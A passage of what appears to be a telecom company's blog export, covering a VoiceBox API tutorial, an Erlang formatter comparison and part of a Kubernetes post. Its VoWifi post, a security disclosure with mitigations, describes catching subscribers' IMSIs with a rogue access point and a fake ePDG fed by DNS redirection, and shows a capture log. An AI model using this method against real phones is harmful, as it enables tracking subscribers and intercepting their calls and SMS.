Alice leaves a voicemail message for Bob, Bob receives this message either as an audio file or as a speech-to-text transcript.\\n\\n\\n![VoiceBox splash screen](/img/blog/building-software-for-a-telecom-core-network/voicebox-splash.png)\\n![VoiceBox home screen](/img/blog/building-software-for-a-telecom-core-network/voicebox-home.png)\\n![Android messaging app](/img/blog/building-software-for-a-telecom-core-network/message-inbox.png)\\n\\n\\nThe product idea isn\u2019t what most people would call revolutionary, but almost all of the world\'s mobile operators have hermetically sealed core networks. This means it would be impossible to build this product without lawyering up and coming to some sort of agreement with one of them. The **wgtwo** core network, however, is open and provides API access to Voicemail, MMS and SMS  (among other things), which is just what we need to build our product.\\n\\n## Developing on the **wgtwo** platform\\n\\nTo create a product on the **wgtwo** platform, the first thing you have to do is create a free developer account at <a href=\\"https://developer.wgtwo.com\\" target=\\"_blank\\">https://developer.wgtwo.com</a>. Once you have signed up, you have to create an Organization and add a Product to that organization.\\n\\nYou can specify what permissions your product will require in the `Product > Scopes` tab:\\n\\n![Developer Portal Scopes Screen](/img/blog/building-software-for-a-telecom-core-network/developer-portal-scopes.png)\\n\\nIn an ideal world, VoiceBox would work like this:\\n1. The subscriber signs in and enables the desired functionality in VoiceBox.\\n2. The next time the subscriber receives a voicemail, an event is fired by **wgtwo**\u2019s core network, which VoiceBox receives.\\n3. VoiceBox triggers an SMS/MMS send using our APIs.\\n4. The subscriber receives an SMS/MMS from the sender \u201cVoiceBox\u201d.\\n\\nIn a few months time this ideal world should be reality, but at the time of writing (mid August 2020) we\u2019re missing the events API and the \u201cSend from Product\u201d API. Currently VoiceBox works like this (changes are highlighted):\\n1. The subscriber signs in and enables the desired functionality in VoiceBox.\\n2. The next time the subscriber receives a voicemail, **VoiceBox will discover it by polling**.\\n3. VoiceBox triggers an MMS send using our APIs.\\n4. The subscriber receives an **MMS from their own number**.\\n\\nIt\u2019s not perfect, but it still demonstrates the potential of the platform. None of this can happen without the subscriber\u2019s consent though, so in the next section we\u2019ll have a look at how that works.\\n\\n## Obtaining user consent\\n\\nThe app we\'re building is touching sensitive data, and we can\'t do that without asking the subscriber if it\u2019s okay. The **wgtwo** platform includes an OAuth implementation with SMS authentication, which means that we can be reasonably sure that the subscriber has consented.\\n\\nWhen a subscriber opens VoiceBox for the first time, they\u2019re met with a login page, and after completing a pin challenge they arrive at an OAuth consent screen. Here they have to accept the terms of VoiceBox, as well as all the required scopes.\\n\\nThe login is branded to look like the product (notice the pink action button), while the consent screen is branded to look like the operator (in our case this is <a href=\\"https://vimla.se\\" target=\\"_blank\\">Vimla</a>, a Swedish operator which uses our platform):\\n![ID login screen](/img/blog/building-software-for-a-telecom-core-network/msisdn-screen.png)\\n![ID pin screen](/img/blog/building-software-for-a-telecom-core-network/pin-screen.png)\\n![ID consent screen](/img/blog/building-software-for-a-telecom-core-network/consent-screen.png)\\n\\nOur platform has a standard <a href=\\"https://oauth.net/2/\\" target=\\"_blank\\">OAuth 2</a> flow. When the subscriber taps \u201cAccept\u201d, **wgtwo** redirects the subscriber to the third-party, which receives an \\"access token\\" that allows them to act on behalf of the subscriber. In this case the access token will let the third-party fetch Voicemails and send MMS from the subscriber, so it\u2019s important to keep it safe.\\nNext we\u2019ll look at using this access token to perform actions on the subscriber\'s behalf.\\n\\n## Connecting to the **wgtwo** API\\n\\nAll **wgtwo** APIs are <a href=\\"https://grpc.io/\\" target=\\"_blank\\">gRPC</a>. This can be a bit intimidating if you are used to REST APIs, but luckily we also have official Java clients distributed through Maven/JitPack. If you want to use a different language you can generate your own client using our public proto files. One of the benefits of gRPC is that you don\u2019t have to ever write your own rest adapter for the API.\\n\\nLet\u2019s have a look at how you can fetch a Voicemail file:\\n\\n```kotlin\\nfun getVoicemail(user: User, uuid: String): Voicemail? {\\n    val getVoicemailRequest = VoicemailProto.GetVoicemailRequest.newBuilder().setVoicemailId(uuid).build()\\n    val voicemail = try {\\n        blockingStub\\n                .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)\\n                .getVoicemail(getVoicemailRequest)\\n    } catch (e: StatusRuntimeException) {\\n        logger.warn(\\"Error getting voicemail $uuid; ${e.message}\\")\\n        throw e\\n    }\\n    if (voicemail.metadata) {\\n        return Voicemail(\\n            ... // we map the gRPC voicemail object to a VoiceBox specific object\\n        )\\n    } else {\\n        logger.warn(\\"No voicemail metadata for $uuid\\")\\n        return null\\n    }\\n}\\n```\\n\\nWe use the official **wgtwo** API client to fetch a voicemail based on the UUID of the voicemail, which we polled for earlier (code not shown).\\n\\nUnlike with REST APIs, we don\'t have to think about writing client code and handling HTTP responses, this is taken care of by the gRPC client library.\\n\\nOnce we have the voicemail, we send it to the subscriber using their own number as the sender:\\n\\n```kotlin\\nfun sendMms(user: User, phone: Msisdn, audio: ByteString) = try {\\n    val request = MmsProto.SendMessageFromSubscriberRequest\\n            .newBuilder()\\n            .addMessageContent(\\n                MmsProto.MessageContent.newBuilder().setAudio(\\n                    MmsProto.AudioContent.newBuilder().setWav(audio)\\n                )\\n            )\\n            .setToE164(phone.toPhoneNumberProto()) // the receiver is the same as the sender\\n            .setFromSubscriber(phone.toPhoneNumberProto()) // the sender is the same as the receiver\\n            .build()\\n    val response = blockingStub\\n            .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)\\n            .sendMessageFromSubscriber(request)\\n    if (response.status == MmsProto.SendResponse.SendStatus.SEND_OK) {\\n        true\\n    } else {\\n        logger.warn(\\"Unable to send MMS to ${phone.e164}: ${response.description} (${response.status.name})\\")\\n        false\\n    }\\n} catch (e: Exception) {\\n    logger.warn(\\"Unable to send MMS to ${phone.e164}: ${e.message}\\")\\n    false\\n}\\n```\\n\\nThis is also pretty straightforward, except for the part where the sender is also the receiver. In the future this will be a bit less confusing, since we\u2019ll be sending the MMS from the product (\u201cVoiceBox\u201d) instead of the subscriber itself.\\n\\n## Conclusion\\n\\nAs you can see, we\u2019re still in the early stages of our developer platform. In the coming year, we will be adding a lot more APIs, as well as building an app-store where subscribers can browse products that they want to add to their subscription. We believe opening up the core network in this way will allow third-party developers to build incredible apps that will lead to much happier subscribers, which will in turn lead to subscriber growth for operators on our platform.\\n\\nAt the time of writing, all apps on the platform have to be free, but we are working on a monetization model similar to that of the Apple and Google app-stores. Our main priority is to come up with a model that is fair to both third-party developers and operators.\\n\\nIf you\u2019re interested in our platform, please head on over to <a href=\\"https://developer.wgtwo.com\\" target=\\"_blank\\">https://developer.wgtwo.com</a> and create an account. If you have any questions please contact us at <products@wgtwo.com>."},{"id":"choosing-erlang-formatter/","metadata":{"permalink":"/blog/choosing-erlang-formatter/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-05-18-formatting-erlang.md","source":"@site/../blog/2020-05-18-formatting-erlang.md","title":"Choosing an Erlang formatter","description":"There are many different Erlang formatters, and as a hack day project","date":"2020-05-18T00:00:00.000Z","formattedDate":"May 18, 2020","tags":[{"label":"erlang","permalink":"/blog/tags/erlang"},{"label":"rebar3","permalink":"/blog/tags/rebar-3"},{"label":"coding","permalink":"/blog/tags/coding"},{"label":"culture","permalink":"/blog/tags/culture"}],"readingTime":7.88,"truncated":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQGKBPb8-fRQrw/profile-displayphoto-shrink_400_400/0/1552936055035?e=1648684800&v=beta&t=Um5M-sEowAYCYIc3uW4aXlzDM7pQSbK1SIEEJPcJD2M","key":"seba"}],"frontMatter":{"slug":"choosing-erlang-formatter/","title":"Choosing an Erlang formatter","date":"2020-05-18T00:00:00.000Z","tags":["erlang","rebar3","coding","culture"],"authors":"seba"},"prevItem":{"title":"Building software for a telecom core network","permalink":"/blog/building-software-for-a-telecom-core-network"},"nextItem":{"title":"VoWifi leaking IMSI","permalink":"/blog/vowifi-imsi-leak/"}},"content":"There are many different Erlang formatters, and as a hack day project\\nI investigated which options exist for us at **wgtwo**. There\\nare two main alternatives, but sadly both have problems.  I\'ve also\\nbriefly looked at an Erlang linter.\\n\\n\x3c!--truncate--\x3e\\n\\n# Background\\n\\nIn **wgtwo** we use a bunch of different programming\\nlanguages, and we all have different experiences and are used to\\ndifferent languages and environments. We are pretty autonomous and we\\nare expected to jump in and out in different services to fix bugs and\\nadd features.\\n\\nWe like when the code is uniform, because it makes it easier to focus\\non the business logic. That is why we want to use tools to make sure\\nour code is consistent no matter who is the author, or which IDE is\\nused, or in which part of the system the code resides.\\n\\nAbout half a year ago there was a discussion about code style within\\n**wgtwo** that resulted in formatting tools being applied for\\nKotlin, Bazel, Go and Java. It also resulted in an internal wiki page\\ncontaining guidelines about code style.\\n\\nThat document highlights some of the problems with mixing different\\ncode-styles. It should be easy for newcomers to maintain the coding\\nstyle. It should also be easy to read diffs, and the discussions about\\ncode style and formatting will be minimized because there is a\\nconcensus.\\n\\n# This is nice, I want it for Erlang\\n\\nAs some of our services are written in Erlang, I wanted to investigate\\nwhich formatters exist for Erlang, and what state they are in. I used\\nour last hack day for this purpose.\\n\\nThe requirements I had was that it should be reproducable. Calling the\\nformatter multiple times should not change the structure more than\\nonce (first time of being called). The formatter should also\\npreferably work with rebar3 (the most used Erlang build tool).  The\\ntool should not use external tooling that wouldn\'t work for all\\ndevelopers flow.\\n\\nI also wanted it to have a short execution time, at least after the\\ninitial formatting.\\n\\n# Benchmark\\n\\nI searched for formatting tools on hex.pm, github.com, duckduckgo.com,\\ngoogle.com and came up with the following arbitrary list of Erlang\\nformatters. There is probably others, but these seems to be the most\\nused.\\n\\n- rebar3_fmt\\n- steamroller\\n- otp/erl_tidy\\n- tsloughter/erl_tidy\\n- rebar3_format\\n- eryngii\\n\\n## [rebar3_fmt](https://github.com/fenollp/erlang-formatter)\\n\\nOne big problem with this is that it uses Emacs `erlang-mode` for\\nformatting. Sure, I am an Emacs user and the `erlang-mode` and its\\nformatting is maintained and supperted by OTP, but my non-Emacs\\ncoworkers would not be happy if they need to install Emacs every time\\nthey want to format the code.\\n\\n## [steamroller](https://github.com/old-reliable/steamroller/)\\n\\nThough it was easy to setup (just add it to dependencies in your Rebar\\nconfig and run `rebar3 steamroll`), my first impression of the\\nexecution was that it was really slow. Even when running subsequent\\ncalls on my Dell XPS 13 P82G it took around 3.5 minutes to format.\\n\\nThe plugin had some support for increasing the number of workers from\\nthe default `--J=1`, but that did not seem to help with the execution\\ntime.\\n\\nThe default steamroller formatting options specify 2 spaces instead of\\nthe `erlang-mode` 4 spaces standard that is used in our code base.\\n\\nHere is a sample of a complex record structure\\n\\n```diff\\n-                   components =\\n-                       [{invoke,\\n-                         #\'Invoke\'{\\n-                            invokeID = 1,linkedID = asn1_NOVALUE,\\n-                            operationCode = updateLocation,\\n-                            parameter =\\n-                                #\'UpdateLocationArg\'{\\n-                                   imsi = IMSI,\\n-                                   \'msc-Number\' = CallingGTBCD,\\n-                                   \'vlr-Number\' = CallingGTBCD}}}]},\\n+   components =\\n+     [\\n+       {\\n+         invoke,\\n+         #\'Invoke\'{\\n+           invokeID = 1,\\n+           linkedID = asn1_NOVALUE,\\n+           operationCode = updateLocation,\\n+           parameter =\\n+             #\'UpdateLocationArg\'{\\n+               imsi = IMSI,\\n+               \'msc-Number\' = CallingGTBCD,\\n+               \'vlr-Number\' = CallingGTBCD\\n+             }\\n+         }\\n+       }\\n+     ]\\n+ },\\n```\\n\\nI was quite happy with the results, even though they were slow, until\\nI saw how it treated maps\\n\\n```diff\\n-      parameters =\\n-          #{called_party_addr =>\\n-                #sccp_addr{\\n-                ... },\\n-            calling_party_addr =>\\n-                #sccp_addr{\\n-                ... },\\n-            data =>\\n-                #\'Continue\'{\\n+         parameters =\\n+             #{\\n+                 called_party_addr\\n+                 =>\\n+                 #sccp_addr{\\n+                   ...\\n+                 },\\n+                 calling_party_addr\\n+                 =>\\n+                 #sccp_addr{\\n+                   ...\\n+                 },\\n+                 data\\n+                 =>\\n+                 #\'Continue\'{\\n```\\n\\nI can\'t say that I easily understand what the parameters are and which\\nthe values are with this formatting. It burns in my eyes.\\n\\n\\n## [erl_tidy](https://github.com/tsloughter/erl_tidy) and [erl_tidy](http://erlang.org/doc/man/erl_tidy.html)\\n\\nSo I found two `erl_tidy` projects, one is included in the Erlang/OTP\\nlibraries. The other one seems just to be a rebar3 wrapper around the\\nfirst one, so I\'ll just talk about the former one.\\n\\nUnder the hood this library uses `erl_prettypr:format/2`, which prints\\nthe abstract syntax tree. This should work well, but gives weird\\nindentation problems.  For instance when it comes to records it will\\nnot add a newline before the first field, so the lines will become\\nquite long, and when the lines become close to the paper width of the\\ndocument then it inserts too many newlines.\\n\\nVisualising with this example again\\n\\n```diff\\n-        components =\\n-            [{invoke,\\n-              #\'Invoke\'{\\n-                 invokeID = 1,linkedID = asn1_NOVALUE,\\n-                 operationCode = updateLocation,\\n-                 parameter =\\n-                     #\'UpdateLocationArg\'{\\n-                        imsi = IMSI,\\n-                        \'msc-Number\' = CallingGTBCD,\\n-                        \'vlr-Number\' = CallingGTBCD}}}]},\\n+     components =\\n+\\t [{invoke,\\n+\\t   #\'Invoke\'{invokeID\\n+\\t\\t\\t =\\n+\\t\\t\\t 1,\\n+\\t\\t     linkedID\\n+\\t\\t\\t =\\n+\\t\\t\\t asn1_NOVALUE,\\n+\\t\\t     operationCode\\n+\\t\\t\\t =\\n+\\t\\t\\t updateLocation,\\n+\\t\\t     parameter\\n+\\t\\t\\t =\\n+\\t\\t\\t #\'UpdateLocationArg\'{imsi\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  IMSI,\\n+\\t\\t\\t\\t\\t      \'msc-Number\'\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  CallingGTBCD,\\n+\\t\\t\\t\\t\\t      \'vlr-Number\'\\n+\\t\\t\\t\\t\\t\\t  =\\n+\\t\\t\\t\\t\\t\\t  CallingGTBCD}}}]},\\n```\\n\\nThere are also some issues with `erl_prettypr`; it throws an exception\\nwhen there are argumented macro functions.\\n\\n```erlang\\n-define(MACRO(), object).\\nfoo(?MACRO()) ->\\n  ok.\\n```\\n\\n```erlang\\n** exception exit: no_translation\\n     in function  io:put_chars/3\\n        called as io:put_chars(<0.4843.0>,unicode,\\n                               [...])\\n     in call from erl_tidy:output/4 (erl_tidy.erl, line 431)\\n     in call from erl_tidy:write_module/3 (erl_tidy.erl, line 413)\\n     in call from erl_tidy:file_2/2 (erl_tidy.erl, line 335)\\n     in call from erl_tidy:file_1/3 (erl_tidy.erl, line 310)\\n```\\n\\n## [rebar3_format](https://github.com/AdRoll/rebar3_format)\\n\\nI had an issue when installing this plugin. It was not as easy as\\nadding `rebar3_format` to plugins in the rebar3 config. The reason I\\nhad problems with it was that the plugin depends on\\n`inaka/katana_code` which for some reason did not get pulled in\\nproperly and was missing some vital files. The issue could be resolved\\nby deleting the user rebar3 cache (`rm -rf ~/.cache/rebar3/`) as\\nexplained in [this issue](https://github.com/AdRoll/rebar3_format/issues/80)\\n\\nAfter installation you need to specify where the source files for\\nformatting can be found. This would probably not be needed if we did\\nnot use an Erlang umberella project (an umberella project is when\\nthere are subapplications residing in your main application).  Here is\\nwhere I found out that the command line option `--files\\napps/**/{src,include}/*.?rl` is apparantly not the same as specifying\\n`{format, [{files, [\u201capps/**/{src,include}/*.?rl\u201d]}]}` in the\\nconfig. The command line options finds only one file, while the config\\nparameter works as expected.\\n\\nFormatting-wise it is similar to `erl_tidy`. This is because it uses\\ninakas `katana_code` which in its turn uses `erl_tidy`.\\n\\n\\n```diff\\n-           components =\\n-               [{invoke,\\n-                 #\'Invoke\'{\\n-                    invokeID = 1,linkedID = asn1_NOVALUE,\\n-                    operationCode = updateLocation,\\n-                    parameter =\\n-                        #\'UpdateLocationArg\'{\\n-                           imsi = IMSI,\\n-                           \'msc-Number\' = CallingGTBCD,\\n-                           \'vlr-Number\' = CallingGTBCD}}}]},\\n+                                      components =\\n+                                          [{invoke,\\n+                                            #\'Invoke\'{invokeID = 1,\\n+                                                      linkedID =\\n+                                                          asn1_NOVALUE,\\n+                                                      operationCode =\\n+                                                          updateLocation,\\n+                                                      parameter =\\n+                                                          #\'UpdateLocationArg\'{imsi\\n+                                                                                   =\\n+                                                                                   IMSI,\\n+                                                                               \'msc-Number\'\\n+                                                                                   =\\n+                                                                                   CallingGTBCD,\\n+                                                                               \'vlr-Number\'\\n+                                                                                   =\\n+                                                                                   CallingGTBCD}}}]},\\n```\\n\\nProblem is that both `erl_tidy` and `katana_code` have multiple issues\\nwith macros. It is hard to process format code which include macros\\nwithout preprocessing the macros.\\n\\n## [eryngii](https://github.com/shiguredo/eryngii)\\n\\nThis was a project I found in github. It is written in oCaml, and has\\nbeen archived by it\'s owner. I really do not want to install oCaml, so\\nI just leave it here as a reference.\\n\\n## [elvis](https://github.com/inaka/elvis)\\n\\nThis is a bonus; it is not a formatter but a linter.\\n\\nOne difference between formatters and linters are that formatters\\nchange the code into a uniform format, and linters warn or fail when\\nrules are broken. Linters can also check other things as nesting level.\\n\\nThis article by Brujo Benavides describe it pretty well.\\n\\n[Are formatters better than linters?](https://medium.com/@elbrujohalcon/are-formatters-better-than-linters-cbab91189be3)\\n\\nSetting it up you need to configure a ruleset and save in a special\\nElvis config file in the repo. This config specifies which linting\\nrules to apply to which files.\\n\\nFor me it took 8-9 minutes for it to execute linting on our code base\\nwith the example ruleset that is proposed by the tool.\\n\\n# Summary\\n\\nSadly I couldn\'t find any good alternatives that fits our\\npurposes. There are issues with macros, or execution time.\\n\\nI have to put this on the shelf again for a while, with just a dream\\nof uniform code.\\n\\n# Edit: 2020-10-01\\n\\nI forgot to update this blogpost, but something amazing happend.\\n\\nAfter I wrote this blog post I contacted the maintainer of\\nsteamroller, and told him about the slowness I experienced, and some\\nother difficulties.  One day later he had found and fixed an algorithm\\ngoing from an `O(n^2)` complexity to an `O(n)`. When retrying it on our\\ncode base, things went from minutes to seconds!\\n\\nHe also removed and improved some of the ambiguous configuration\\nparameters.\\n\\nI haven\'t yet started to look at the map formatting issues I had, but\\nmaybe that is improved as well. Anyway I\'ll have to leave that for\\nanother hackday."},{"id":"vowifi-imsi-leak/","metadata":{"permalink":"/blog/vowifi-imsi-leak/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-03-30-catch-imsi-from-vowifi-session.md","source":"@site/../blog/2020-03-30-catch-imsi-from-vowifi-session.md","title":"VoWifi leaking IMSI","description":"4G offers more services than the earlier generation such as 3G and 2G. One of","date":"2020-03-30T00:00:00.000Z","formattedDate":"March 30, 2020","tags":[{"label":"telco","permalink":"/blog/tags/telco"},{"label":"4G","permalink":"/blog/tags/4-g"},{"label":"ePDG","permalink":"/blog/tags/e-pdg"},{"label":"VoWifi","permalink":"/blog/tags/vo-wifi"},{"label":"networking","permalink":"/blog/tags/networking"},{"label":"security","permalink":"/blog/tags/security"}],"readingTime":5.335,"truncated":true,"authors":[{"author":"Roger Skjetlein","title":"Senior Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/rskjetlein/","imageURL":"https://media-exp1.licdn.com/dms/image/C4E03AQH5jRmUxivpng/profile-displayphoto-shrink_400_400/0/1516289349229?e=1648684800&v=beta&t=5lPorNrvLAyqoZ1Tx0wCjosDkNqaTGXykCKeQXO4seY","key":"roger-skjetlein"}],"frontMatter":{"slug":"vowifi-imsi-leak/","title":"VoWifi leaking IMSI","date":"2020-03-30T00:00:00.000Z","tags":["telco","4G","ePDG","VoWifi","networking","security"],"authors":"roger-skjetlein"},"prevItem":{"title":"Choosing an Erlang formatter","permalink":"/blog/choosing-erlang-formatter/"},"nextItem":{"title":"Extending Kubernetes for our needs","permalink":"/blog/extending-k8s/"}},"content":"4G offers more services than the earlier generation such as 3G and 2G. One of\\nthe services has really have gained traction later years is VoLTE (Voice\\nover LTE) and VoWifi (Voice over Wifi) that we will go more in dept regarding security.\\n\\n\x3c!--truncate--\x3e\\n\\nVoWifi is beneficial in terms being able to use any Wifi connection offering public\\ninternet access thus extending and improving the coverage and connectivity.\\nThink of it as building our own cellular network, but\\nusing commodity wifi components instead and avoiding the strict regulation and\\nlicensing of spectrum.\\n\\n## What is IMSI\\n*The international mobile subscriber identity (IMSI) is a number that uniquely\\nidentifies every user of a cellular network. It is stored as a 64-bit field\\nand is sent by the mobile device to the network. It is also used for acquiring\\nother details of the mobile in the home location register (HLR) or as locally\\ncopied in the visitor location register. To prevent eavesdroppers from\\nidentifying and tracking the subscriber on the radio interface, the IMSI is sent\\nas rarely as possible and a randomly-generated TMSI is sent instead.*\\n\\n* [IMSI article](https://en.wikipedia.org/wiki/International_mobile_subscriber_identity)\\n\\n### Security implications\\nThe IMSI is a secret identifier stored on the sim and can be exploited in many\\nways once known. It is bound to the sim, so changing UE will not help.\\n\\nExamples:\\n* Locating user (UE)\\n* Intercepting calls\\n* Intercepting SMS (stealing two factor pin eg.)\\n* ..and more\\n\\n## How VoWifi works\\nWhen your phone is connected to datanetwork and with volte and vowifi enabled\\nthe device (UE) establish sip session directly to packetgateway via 4g, and via\\npublic internet to epdg (evolved packet data gateway) which is in essence a\\nipsec (ikev2) termination using SIM-AKA to authenticate UE. The ipsec comes into\\nplay since epdg is exposed publicly.\\n\\nWe won\'t go further in depth for volte and vowifi since there are already\\nexcellent articles about the matter:\\n* [Voice over WLAN](https://en.wikipedia.org/wiki/Voice_over_WLAN)\\n* [Voice over LTE](https://en.wikipedia.org/wiki/Voice_over_LTE)\\n\\n![VoWifi topology](/img/blog/vowifi-imsi-leak/vowifi.jpg)\\n\\nTo enable VoWifi on your device, please refer to your device manufacturer website:\\n\\n* [Android](https://support.google.com/phoneapp/answer/2811843?hl=en)\\n* [Apple](https://support.apple.com/en-in/HT203032)\\n\\nAlso check on your operator website if VoWifi is supported in your region. Please note that VoWifi is usually blocked when roaming.\\n\\n\\n## EPDG exposed on the public internet\\nThe Evolved Packet Data Gateway needs to be publicly available on the internet\\nsince UE needs to access it from an arbitrary no-trusted connection. The ipsec\\nwill secure and encrypt both the data and maintain the integrity of the\\nconnection throughout the session.\\n\\nThe UE finds the epdg termination point by looking dns records partly following\\na convention decided by 3gpp and typically looks like this in DNS:\\n\\n```\\nepdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 1.2.3.4\\nepdg.epc.mnc999.mcc999.pub.3gppnetwork.org. 3488 IN A 5.6.7.8\\n```\\n\\nFrom the DNS records we recognize the network operator (MNC) and the\\ncountry code (MCC).\\n\\nThe DNS records are registered under a delegated domain owned by GSMA and\\nusually are redelegated to operator under their own umbrella, like the example\\nmnc999.mcc999.pub.3gppnetwork.org.\\n\\n## The problem\\nWhen UE establish session to epdg it uses a vpn, a ipsec relationship using\\nIKEv2 for authentication, encryption and integrity.\\n\\nSo far the implementation works as intended and provides good security through\\nencryption and security.\\n\\nThe problem is not the VoWifi per see, by rather how ipsec establish the\\nsession. When UE connects to the epdg, it acts as a initiator and the epdg is\\ninherently passive since it cannot know where from (ip) the UE will come from.\\n\\n![sim-aka flow](/img/blog/vowifi-imsi-leak/sim-aka.png)\\n\\n### EAP-AKA exposes identity\\nVowifi as mentioned earlier utilises an encryption protocol based on the widely\\nadopted Extensible Authentication Protocol. EAP itself is just a protocol and\\ndoes not define the contents of the data or how exact the data exchanges look\\nlike. EAP-AKA unfortunately exposes the unencrypted user identity during\\nthe authentication session and in this case the user identity is equal to the\\nimsi.\\n\\n#### Solution\\nThis is the hardest problem to solve since it needs a security layer or settings\\nthat comes before ipsec starts to connect.\\n\\nThe proposed solutions\\n* Force the use of conservative peer for eap-aka/sim\\nand use pseudonym identity (tmsi) to avoid exposing imsi.\\n* Enable EAP-TTLS in addition to EAP-AKA/SIM\\n* Only connect trusted/encrypted AP\'s\\n\\n### Fake Ipsec termination exposes identity\\nBy impersonating a epdg by redirecting all dns requests for any\\n`pub.3gppnetwork.org.` to our own fake ipsec termination providing just enough\\nto catch the imsi.\\n\\nA raspberry pie can easily be setup to constantly scan for open wifi networks,\\nthen impersonating the ssid in hope of lure ue\'s to connect. Any UE set to use\\nVoWiFi connecting to the fake access point will give away their imsi.\\n\\nA wifi ssid scan example of what we can automate. In this case the Isfjell-Guest\\nwould have been picked to catch imsi since its open and unencrypted:\\n\\n![wifi-ssid](/img/blog/vowifi-imsi-leak/wlan-ssid.png)\\n\\nSnippet from the ipsec termination, UE (iPhone 8) exposes imsi several times:\\n```\\n13[ENC] parsed IKE_AUTH request 2 [ EAP/RES/AKA ]\\n13[IKE] \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\' is not a reauth identity\\n13[IKE] \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\' is not a pseudonym\\n13[IKE] received identity \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n13[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA\\n13[LIB] tried 0 SIM providers, but none had a quintuplet for \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n13[IKE] failed to map pseudonym/reauth identity \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\', fallback to permanent identity request\\n13[ENC] generating IKE_AUTH response 2 [ EAP/REQ/AKA ]\\n13[NET] sending packet: from 192.168.17.1[500] to 192.168.17.24[500] (92 bytes)\\n09[NET] received packet: from 192.168.17.24[500] to 192.168.17.1[500] (140 bytes)\\n09[ENC] parsed IKE_AUTH request 3 [ EAP/RES/AKA ]\\n09[IKE] received identity \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n09[IKE] no EAP key found for 09999994511******@wlan.mnc999.mcc999.3gppnetwork.org to authenticate with AKA\\n09[LIB] tried 0 SIM providers, but none had a quintuplet for \'09999994511******@wlan.mnc999.mcc999.3gppnetwork.org\'\\n09[IKE] EAP method EAP_AKA failed for peer 09999994511******@nai.epc.mnc999.mcc999.3gppnetwork.org\\n09[ENC] generating IKE_AUTH response 3 [ EAP/FAIL ]\\n```\\n\\n#### Solution\\nIpsec clients (UE) are able to verify the identity of the epdg by requesting\\nand validating a machine certificate proving it is the actual service belonging\\nto the requested dns address. This means when the client connects, the server\\nhas to provide a valid certificate containing the dns names and signed by a\\ntrusted CA.\\n\\n## Raspberry PI 4\\n\\nThe specific physical setup used for testing. Older PI\'s should work just fine and also\\nother platforms that can run dnsmasq, tshark and strongswan for ipsec with\\nsupport for eap-aka/sim.\\n\\n![rpi4 and battery](/img/blog/vowifi-imsi-leak/rpi4-batt.jpg)\\n\\n*white box is the rpi4 in a original casing and gray box is a battery bank*"},{"id":"extending-k8s/","metadata":{"permalink":"/blog/extending-k8s/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-02-21-Extending-Kubernetes-Static-IP-Routing.md","source":"@site/../blog/2020-02-21-Extending-Kubernetes-Static-IP-Routing.md","title":"Extending Kubernetes for our needs","description":"We are using Kubernetes as our cluster scheduler and this serves us well. However we have a","date":"2020-02-21T00:00:00.000Z","formattedDate":"February 21, 2020","tags":[{"label":"infrastructure","permalink":"/blog/tags/infrastructure"},{"label":"kubernetes","permalink":"/blog/tags/kubernetes"},{"label":"networking","permalink":"/blog/tags/networking"},{"label":"AWS","permalink":"/blog/tags/aws"}],"readingTime":11.345,"truncated":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer @ wgtwo","url":"https://www.linkedin.com/in/hihrig/","imageURL":"https://media-exp1.licdn.com/dms/image/C5603AQGc3sG-ltGzlA/profile-displayphoto-shrink_400_400/0/1516250699138?e=1648684800&v=beta&t=qpxr39O2hNY54vsUcCbt1wH8fc2lMf07zW1etQD_gxY","key":"holger-ihrig"}],"frontMatter":{"slug":"extending-k8s/","title":"Extending Kubernetes for our needs","date":"2020-02-21T00:00:00.000Z","tags":["infrastructure","kubernetes","networking","AWS"],"authors":"holger-ihrig"},"prevItem":{"title":"VoWifi leaking IMSI","permalink":"/blog/vowifi-imsi-leak/"},"nextItem":{"title":"Towards observability nirvana: infinite metric retention with Thanos","permalink":"/blog/metrics-unlimited-thanos"}},"content":"We are using Kubernetes as our cluster scheduler and this serves us well. However we have a\\nfew cases where we need to do some additional work.\\n\\n\x3c!--truncate--\x3e\\n\\nOne case for example is that we have to use static IPs for some of our services to connect to\\nTelecom companies as they expect a single IP address to bind to. This address needs to be fixed and\\nDNS records are not accepted either. We are running in AWS as well, so the reader might ask why are we not\\nusing Elastic IPs and adding them to the services? Good idea, but Telecom operators will not whitelist\\nan Elastic IP for you as there are no guarantees that it will belong to your company infrastructure forever. There\\nare also additional challenges when it comes to using Elastic IP in private subnet over VPN or direct connect.\\n\\nWe are a member of RIPE and do have a small subnet block for our own use, so we thought we could make use of\\nthat. As we own the block and AWS supports BYOIP (Bring your own IP-range), we created a special subnet with\\nsome Kubernetes nodes in it. This was not enough to make this work since we depended on a service always having\\nthe same IP attached to it, as well as the node running a pod having some very specific Routes set.\\n\\nWith this scenario in mind we set out to find solutions and all solutions we could think of required haggling\\nwith Kubernetes.\\n\\n## Extending Kubernetes\\n\\nThere are several ways to extend Kubernetes. All functionality in Kubernetes is build upon very nice and clean\\npublic APIs, or to say it with other words: There is no private API magic hidden somewhere. So lets look at\\ntwo ways on how to extend Kubernetes.\\n\\nPossible ways to go forward:\\n- Adding a scheduler extender\\n- Creating an operator/controller\\n\\nThere are more ways to extend Kubernetes, but these two ways will be the one we shall look at. Just for completeness\\nyou can as well also add another scheduler or change Kubernetes itself. However these possibilities have some serious\\ndownsides.\\n\\n### Adding a scheduler extender\\nThe Kubernetes scheduler checks for certain requirements before it schedules a pod onto a node. Some of these requirements\\nare hard requirements, like cpu, memory and number of pods. Other requirements are more soft, like if the 